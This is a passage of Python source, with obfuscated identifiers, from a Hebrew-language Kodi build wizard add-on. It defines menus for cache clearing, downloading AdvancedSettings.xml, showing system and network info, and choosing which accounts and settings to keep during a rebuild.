		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%O0O00000OO00000O0 [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2888
		addFile ('--- ניקוי קאש בהפעלה: %s'%O0OO000OO0OO0O0O0 .replace ('true',OO00OO00O00O0O0O0 ).replace ('false',O000OO000O0OOO0O0 ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2889
		addFile ('--- ניקוי חבילות בהפעלה: %s'%O0OOO000OO0O00O0O .replace ('true',OO00OO00O00O0O0O0 ).replace ('false',O000OO000O0OOO0O0 ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2890
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%OOOO0OOOOO00O00OO .replace ('true',OO00OO00O00O0O0O0 ).replace ('false',O000OO000O0OOO0O0 ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2891
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2892
	addFile ('Include Video Cache in Clear Cache: %s'%OO0O00O0OOO0O0000 .replace ('true',OO00OO00O00O0O0O0 ).replace ('false',O000OO000O0OOO0O0 ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2893
	if OO0O00O0OOO0O0000 =='true':#line:2894
		addFile ('--- Include All Video Addons: %s'%O0O00OO0O0OOO0OO0 .replace ('true',OO00OO00O00O0O0O0 ).replace ('false',O000OO000O0OOO0O0 ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2895
		addFile ('--- Include Bob: %s'%OOOO0O00OO00OO00O .replace ('true',OO00OO00O00O0O0O0 ).replace ('false',O000OO000O0OOO0O0 ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2896
		addFile ('--- Include Phoenix: %s'%O0OOO000OOOO0OO00 .replace ('true',OO00OO00O00O0O0O0 ).replace ('false',O000OO000O0OOO0O0 ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2897
		addFile ('--- Include Specto: %s'%OO00OOO000OOOO0O0 .replace ('true',OO00OO00O00O0O0O0 ).replace ('false',O000OO000O0OOO0O0 ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2898
		addFile ('--- Include Exodus: %s'%OO0O0O0000O0O0OOO .replace ('true',OO00OO00O00O0O0O0 ).replace ('false',O000OO000O0OOO0O0 ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2899
		addFile ('--- Include Salts: %s'%OOOO0O00OOO0OOO00 .replace ('true',OO00OO00O00O0O0O0 ).replace ('false',O000OO000O0OOO0O0 ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2900
		addFile ('--- Include Salts HD Lite: %s'%O0OOOO00OO0O00O00 .replace ('true',OO00OO00O00O0O0O0 ).replace ('false',O000OO000O0OOO0O0 ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2901
		addFile ('--- Include One Channel: %s'%O0OO0OO00O0O000OO .replace ('true',OO00OO00O00O0O0O0 ).replace ('false',O000OO000O0OOO0O0 ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2902
		addFile ('--- Include Genesis: %s'%O0OOOO0000O00OO00 .replace ('true',OO00OO00O00O0O0O0 ).replace ('false',O000OO000O0OOO0O0 ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2903
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2904
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2905
	setView ('files','viewType')#line:2906
def advancedWindow (url =None ):#line:2908
	if not ADVANCEDFILE =='http://':#line:2909
		if url ==None :#line:2910
			OOOOOO000O0O0OO0O =wiz .workingURL (ADVANCEDFILE )#line:2911
			O000000OO0O0O0000 =uservar .ADVANCEDFILE #line:2912
		else :#line:2913
			OOOOOO000O0O0OO0O =wiz .workingURL (url )#line:2914
			O000000OO0O0O0000 =url #line:2915
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2916
		if os .path .exists (ADVANCED ):#line:2917
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2918
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2919
		if OOOOOO000O0O0OO0O ==True :#line:2920
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2921
			OO0OO000OOO0O00O0 =wiz .openURL (O000000OO0O0O0000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2922
			OOO00OO00O0OOOO0O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO0OO000OOO0O00O0 )#line:2923
			if len (OOO00OO00O0OOOO0O )>0 :#line:2924
				for OOO00000OO0OOO0O0 ,O0OOOO0000O0OO0OO ,url ,O0000O00OO0OO00OO ,O00OOO0O0O0OOOOO0 ,O0O0000000OOO0O00 in OOO00OO00O0OOOO0O :#line:2925
					if O0OOOO0000O0OO0OO .lower ()=="yes":#line:2926
						addDir ("[B]%s[/B]"%OOO00000OO0OOO0O0 ,'advancedsetting',url ,description =O0O0000000OOO0O00 ,icon =O0000O00OO0OO00OO ,fanart =O00OOO0O0O0OOOOO0 ,themeit =THEME3 )#line:2927
					else :#line:2928
						addFile (OOO00000OO0OOO0O0 ,'writeadvanced',OOO00000OO0OOO0O0 ,url ,description =O0O0000000OOO0O00 ,icon =O0000O00OO0OO00OO ,fanart =O00OOO0O0O0OOOOO0 ,themeit =THEME2 )#line:2929
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2930
		else :wiz .log ("[Advanced Settings] URL not working: %s"%OOOOOO000O0O0OO0O )#line:2931
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2932
def writeAdvanced (OO0O0000OO00O0O00 ,O0O0O0O0O0O0000O0 ):#line:2934
	O00OO000O0O0O00O0 =wiz .workingURL (O0O0O0O0O0O0000O0 )#line:2935
	if O00OO000O0O0O00O0 ==True :#line:2936
		if os .path .exists (ADVANCED ):OOOO000000OO00000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OO0O0000OO00O0O00 ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2937
		else :OOOO000000OO00000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OO0O0000OO00O0O00 ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2938
		if OOOO000000OO00000 ==1 :#line:2940
			OO00OO0O0OO0OOOOO =wiz .openURL (O0O0O0O0O0O0000O0 )#line:2941
			OO0OOO0OOOO000OO0 =open (ADVANCED ,'w');#line:2942
			OO0OOO0OOOO000OO0 .write (OO00OO0O0OO0OOOOO )#line:2943
			OO0OOO0OOOO000OO0 .close ()#line:2944
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2945
			wiz .killxbmc (True )#line:2946
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2947
	else :wiz .log ("[Advanced Settings] URL not working: %s"%O00OO000O0O0O00O0 );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2948
def viewAdvanced ():#line:2950
	OOOO0O0OOOOO0OOOO =open (ADVANCED )#line:2951
	OO0O00OOOO0OO0000 =OOOO0O0OOOOO0OOOO .read ().replace ('\t','    ')#line:2952
	wiz .TextBox (ADDONTITLE ,OO0O00OOOO0OO0000 )#line:2953
	OOOO0O0OOOOO0OOOO .close ()#line:2954
def removeAdvanced ():#line:2956
	if os .path .exists (ADVANCED ):#line:2957
		wiz .removeFile (ADVANCED )#line:2958
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2959
def showAutoAdvanced ():#line:2961
	notify .autoConfig ()#line:2962
def getIP ():#line:2964
	O0O0000OO0OOOOO00 ='http://whatismyipaddress.com/'#line:2965
	if not wiz .workingURL (O0O0000OO0OOOOO00 ):return 'Unknown','Unknown','Unknown'#line:2966
	OOO00O00O0O000O00 =wiz .openURL (O0O0000OO0OOOOO00 ).replace ('\n','').replace ('\r','')#line:2967
	if not 'Access Denied'in OOO00O00O0O000O00 :#line:2968
		OOOO0000OOO0O0O00 =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (OOO00O00O0O000O00 )#line:2969
		O0O00OO0OO0OOO000 =OOOO0000OOO0O0O00 [0 ]if (len (OOOO0000OOO0O0O00 )>0 )else 'Unknown'#line:2970
		O00O0O00O0O0OOO00 =re .compile ('"font-size:14px;">(.+?)</td>').findall (OOO00O00O0O000O00 )#line:2971
		OO0OO0OOO0OO0O0O0 =O00O0O00O0O0OOO00 [0 ]if (len (O00O0O00O0O0OOO00 )>0 )else 'Unknown'#line:2972
		OOO0O0OOOOOOOO000 =O00O0O00O0O0OOO00 [1 ]+', '+O00O0O00O0O0OOO00 [2 ]+', '+O00O0O00O0O0OOO00 [3 ]if (len (O00O0O00O0O0OOO00 )>2 )else 'Unknown'#line:2973
		return O0O00OO0OO0OOO000 ,OO0OO0OOO0OO0O0O0 ,OOO0O0OOOOOOOO000 #line:2974
	else :return 'Unknown','Unknown','Unknown'#line:2975
def systemInfo ():#line:2977
	O00OOO000OO00O000 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2991
	OOOOO00000OOOO0O0 =[];O0OOO0OO0O0O0O0OO =0 #line:2992
	for OO0O00000O000O0O0 in O00OOO000OO00O000 :#line:2993
		OOO00O0OO0OO00O00 =wiz .getInfo (OO0O00000O000O0O0 )#line:2994
		OO00OOOOOOO00000O =0 #line:2995
		while OOO00O0OO0OO00O00 =="Busy"and OO00OOOOOOO00000O <10 :#line:2996
			OOO00O0OO0OO00O00 =wiz .getInfo (OO0O00000O000O0O0 );OO00OOOOOOO00000O +=1 ;wiz .log ("%s sleep %s"%(OO0O00000O000O0O0 ,str (OO00OOOOOOO00000O )));xbmc .sleep (1000 )#line:2997
		OOOOO00000OOOO0O0 .append (OOO00O0OO0OO00O00 )#line:2998
		O0OOO0OO0O0O0O0OO +=1 #line:2999
	OO0OOOO0O0O00O00O =OOOOO00000OOOO0O0 [8 ]if 'Una'in OOOOO00000OOOO0O0 [8 ]else wiz .convertSize (int (float (OOOOO00000OOOO0O0 [8 ][:-8 ]))*1024 *1024 )#line:3000
	O0O0O0O00OO00O0OO =OOOOO00000OOOO0O0 [9 ]if 'Una'in OOOOO00000OOOO0O0 [9 ]else wiz .convertSize (int (float (OOOOO00000OOOO0O0 [9 ][:-8 ]))*1024 *1024 )#line:3001
	O0OOOO0OO0OOOOO0O =OOOOO00000OOOO0O0 [10 ]if 'Una'in OOOOO00000OOOO0O0 [10 ]else wiz .convertSize (int (float (OOOOO00000OOOO0O0 [10 ][:-8 ]))*1024 *1024 )#line:3002
	O0O00O0O00000000O =wiz .convertSize (int (float (OOOOO00000OOOO0O0 [11 ][:-2 ]))*1024 *1024 )#line:3003
	O00000OO000000OO0 =wiz .convertSize (int (float (OOOOO00000OOOO0O0 [12 ][:-2 ]))*1024 *1024 )#line:3004
	O00O00O00O00OO000 =wiz .convertSize (int (float (OOOOO00000OOOO0O0 [13 ][:-2 ]))*1024 *1024 )#line:3005
	OOO0O00OO0OOO000O ,O00OOOO0O0OOOO0OO ,OOO0O0000O0OOOOOO =getIP ()#line:3006
	OO00O0O00O000OOO0 =[];O00O0OO0OO00000O0 =[];O0OOOO0OO000OOO00 =[];OOOOOO0000OO0O0OO =[];O000O0O0OOOOO0OOO =[];O0OO0000OO0OOOO0O =[];OOO00OO0O0OOO0000 =[]#line:3008
	OOOOO0O0O00000OO0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3010
	for O00O0OO00O0OO0000 in sorted (OOOOO0O0O00000OO0 ,key =lambda O00OOO00OOO00000O :O00OOO00OOO00000O ):#line:3011
		OOOO000OOO00OOO00 =os .path .split (O00O0OO00O0OO0000 [:-1 ])[1 ]#line:3012
		if OOOO000OOO00OOO00 =='packages':continue #line:3013
		O0OO0O0OOOOOOO00O =os .path .join (O00O0OO00O0OO0000 ,'addon.xml')#line:3014
		if os .path .exists (O0OO0O0OOOOOOO00O ):#line:3015
			O0OOO0OOO00O00O0O =open (O0OO0O0OOOOOOO00O )#line:3016
			OOOOOO0OOO0OO0OO0 =O0OOO0OOO00O00O0O .read ()#line:3017
			O0OOO0000OOO0O0O0 =re .compile ("<provides>(.+?)</provides>").findall (OOOOOO0OOO0OO0OO0 )#line:3018
			if len (O0OOO0000OOO0O0O0 )==0 :#line:3019
				if OOOO000OOO00OOO00 .startswith ('skin'):OOO00OO0O0OOO0000 .append (OOOO000OOO00OOO00 )#line:3020
				if OOOO000OOO00OOO00 .startswith ('repo'):O000O0O0OOOOO0OOO .append (OOOO000OOO00OOO00 )#line:3021
				else :O0OO0000OO0OOOO0O .append (OOOO000OOO00OOO00 )#line:3022
			elif not (O0OOO0000OOO0O0O0 [0 ]).find ('executable')==-1 :OOOOOO0000OO0O0OO .append (OOOO000OOO00OOO00 )#line:3023
			elif not (O0OOO0000OOO0O0O0 [0 ]).find ('video')==-1 :O0OOOO0OO000OOO00 .append (OOOO000OOO00OOO00 )#line:3024
			elif not (O0OOO0000OOO0O0O0 [0 ]).find ('audio')==-1 :O00O0OO0OO00000O0 .append (OOOO000OOO00OOO00 )#line:3025
			elif not (O0OOO0000OOO0O0O0 [0 ]).find ('image')==-1 :OO00O0O00O000OOO0 .append (OOOO000OOO00OOO00 )#line:3026
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3028
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO00000OOOO0O0 [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3029
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO00000OOOO0O0 [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3030
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3031
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO00000OOOO0O0 [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3032
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO00000OOOO0O0 [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3033
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3035
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO00000OOOO0O0 [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3036
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO00000OOOO0O0 [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3037
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3039
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOOO0O0O00O00O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3040
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0O0O00OO00O0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3041
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOOO0OO0OOOOO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3042
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3044
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O00O0O00000000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3045
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00000OO000000OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3046
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O00O00O00OO000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3047
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3049
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO00000OOOO0O0 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3050
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O00OO0OOO000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3051
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OOOO0O0OOOO0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3052
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O0000O0OOOOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3053
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO00000OOOO0O0 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3054
	O0O00O0000OOOO00O =len (OO00O0O00O000OOO0 )+len (O00O0OO0OO00000O0 )+len (O0OOOO0OO000OOO00 )+len (OOOOOO0000OO0O0OO )+len (O0OO0000OO0OOOO0O )+len (OOO00OO0O0OOO0000 )+len (O000O0O0OOOOO0OOO )#line:3056
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,O0O00O0000OOOO00O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3057
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OOOO0OO000OOO00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3058
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOOOO0000OO0O0OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3059
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00O0OO0OO00000O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3060
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO00O0O00O000OOO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3061
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O000O0O0OOOOO0OOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3062
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO00OO0O0OOO0000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3063
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OO0000OO0OOOO0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3064
def Menu ():#line:3065
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3066
def saveMenu ():#line:3068
	O0O0OOO000OO0000O ='[COLOR yellow]מופעל[/COLOR]';OOO0O0OO0OO00O0OO ='[COLOR blue]מבוטל[/COLOR]'#line:3070
	OOO0000O000000000 ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3071
	OO0O0OOOO000OOO00 ='true'if KEEPMOVIELIST =='true'else 'false'#line:3072
	O000OOO0000OOO00O ='true'if KEEPINFO =='true'else 'false'#line:3073
	OO00000OOO000OOO0 ='true'if KEEPSOUND =='true'else 'false'#line:3075
	O00O0OO0OO0O00O00 ='true'if KEEPVIEW =='true'else 'false'#line:3076
	O00OO000OOO0OOO00 ='true'if KEEPSKIN =='true'else 'false'#line:3077
	O0O00OOO0000OOOOO ='true'if KEEPSKIN2 =='true'else 'false'#line:3078
	OO0000OO0OO00000O ='true'if KEEPSKIN3 =='true'else 'false'#line:3079
	O00O00000O0OO00O0 ='true'if KEEPADDONS =='true'else 'false'#line:3080
	OOOOOO00O00OO0000 ='true'if KEEPPVR =='true'else 'false'#line:3081
	OO0OOOO00O00OO00O ='true'if KEEPTVLIST =='true'else 'false'#line:3082
	OOO0OO000OO0000O0 ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3083
	O0OOOOO0OO000O0O0 ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3084
	O0O00O00OOOO00O0O ='true'if KEEPHUBTV =='true'else 'false'#line:3085
	OO00OO000O000O0OO ='true'if KEEPHUBVOD =='true'else 'false'#line:3086
	OO0O00O0O000O0OO0 ='true'if KEEPHUBSPORT =='true'else 'false'#line:3087
	O0O0000O00OO000OO ='true'if KEEPHUBKIDS =='true'else 'false'#line:3088
	O00O0O0O0O0O00OOO ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3089
	OO0OO00O0O000OOO0 ='true'if KEEPHUBMENU =='true'else 'false'#line:3090
	OOO000O0O00O0O00O ='true'if KEEPPLAYLIST =='true'else 'false'#line:3091
	O0OOO00O0O0O0OO00 ='true'if KEEPTRAKT =='true'else 'false'#line:3092
	O0OO0OO0O0OO0OOO0 ='true'if KEEPREAL =='true'else 'false'#line:3093
	O0O000O0O0OO0O000 ='true'if KEEPRD2 =='true'else 'false'#line:3094
	O0OO0OO0OO00OOOOO ='true'if KEEPTORNET =='true'else 'true'#line:3095
	OO0OO0O00OO0OO00O ='true'if KEEPLOGIN =='true'else 'false'#line:3096
	OOO00OOOO000OOO0O ='true'if KEEPSOURCES =='true'else 'false'#line:3097
	OO00OOOOO0O0O000O ='true'if KEEPADVANCED =='true'else 'false'#line:3098
	OO000OOOOOOO0OO00 ='true'if KEEPPROFILES =='true'else 'false'#line:3099
	O000O00O00O000000 ='true'if KEEPFAVS =='true'else 'false'#line:3100
	O00O0OO00OO0OOOO0 ='true'if KEEPREPOS =='true'else 'false'#line:3101
	OO0OO0O0O000O0000 ='true'if KEEPSUPER =='true'else 'false'#line:3102
	OOO0OOOOO0O0O000O ='true'if KEEPWHITELIST =='true'else 'false'#line:3103
	O0O0OOO00O000O00O ='true'if KEEPWEATHER =='true'else 'false'#line:3104
	if OOO0OOOOO0O0O000O =='true':#line:3108
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3109
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3110
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3111
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3112
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3113
	addFile ('%s התקנת קיר סרטים: '%OOO0000O000000000 .replace ('true',O0O0OOO000OO0000O ).replace ('false',OOO0O0OO0OO00O0OO ),'togglesetting','keepmoviewall',icon =ICONTRAKT ,themeit =THEME1 )#line:3115
	addFile ('%s שמירת חשבון RD:  '%O0OO0OO0O0OO0OOO0 .replace ('true',O0O0OOO000OO0000O ).replace ('false',OOO0O0OO0OO00O0OO ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3116
	addFile ('%s שמירת חשבון טראקט:  '%O0OOO00O0O0O0OO00 .replace ('true',O0O0OOO000OO0000O ).replace ('false',OOO0O0OO0OO00O0OO ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3117
	addFile ('%s שמירת מועדפים:  '%O000O00O00O000000 .replace ('true',O0O0OOO000OO0000O ).replace ('false',OOO0O0OO0OO00O0OO ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3120
	addFile ('%s שמירת לקוח טלוויזיה:  '%OOOOOO00O00OO0000 .replace ('true',O0O0OOO000OO0000O ).replace ('false',OOO0O0OO0OO00O0OO ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3121
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%OO0OOOO00O00OO00O .replace ('true',O0O0OOO000OO0000O ).replace ('false',OOO0O0OO0OO00O0OO ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3122
	addFile ('%s שמירת אריח סרטים:  '%OOO0OO000OO0000O0 .replace ('true',O0O0OOO000OO0000O ).replace ('false',OOO0O0OO0OO00O0OO ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3123
	addFile ('%s שמירת אריח סדרות:  '%O0OOOOO0OO000O0O0 .replace ('true',O0O0OOO000OO0000O ).replace ('false',OOO0O0OO0OO00O0OO ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3124
	addFile ('%s שמירת אריח טלויזיה:  '%O0O00O00OOOO00O0O .replace ('true',O0O0OOO000OO0000O ).replace ('false',OOO0O0OO0OO00O0OO ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3125
	addFile ('%s שמירת אריח תוכן ישראלי:  '%OO00OO000O000O0OO .replace ('true',O0O0OOO000OO0000O ).replace ('false',OOO0O0OO0OO00O0OO ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3126
	addFile ('%s שמירת אריח ספורט:  '%OO0O00O0O000O0OO0 .replace ('true',O0O0OOO000OO0000O ).replace ('false',OOO0O0OO0OO00O0OO ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3127
	addFile ('%s שמירת אריח ילדים:  '%O0O0000O00OO000OO .replace ('true',O0O0OOO000OO0000O ).replace ('false',OOO0O0OO0OO00O0OO ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3128
	addFile ('%s שמירת אריח מוסיקה:  '%O00O0O0O0O0O00OOO .replace ('true',O0O0OOO000OO0000O ).replace ('false',OOO0O0OO0OO00O0OO ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3129
	addFile ('%s שמירת תפריט אריחים ראשי:  '%OO0OO00O0O000OOO0 .replace ('true',O0O0OOO000OO0000O ).replace ('false',OOO0O0OO0OO00O0OO ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3130
	addFile ('%s שמירת כל האריחים בסקין:  '%O00OO000OOO0OOO00 .replace ('true',O0O0OOO000OO0000O ).replace ('false',OOO0O0OO0OO00O0OO ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3131
	addFile ('%s שמירת הגדרות מזג האוויר:  '%O0O0OOO00O000O00O .replace ('true',O0O0OOO000OO0000O ).replace ('false',OOO0O0OO0OO00O0OO ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3132
	addFile ('%s שמירת הרחבות שהתקנתי:  '%O00O00000O0OO00O0 .replace ('true',O0O0OOO000OO0000O ).replace ('false',OOO0O0OO0OO00O0OO ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3138
	addFile ('%s שמירת סיסמאות, חשבונות ,מיקומי הורדות:  '%O000OOO0000OOO00O .replace ('true',O0O0OOO000OO0000O ).replace ('false',OOO0O0OO0OO00O0OO ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3139
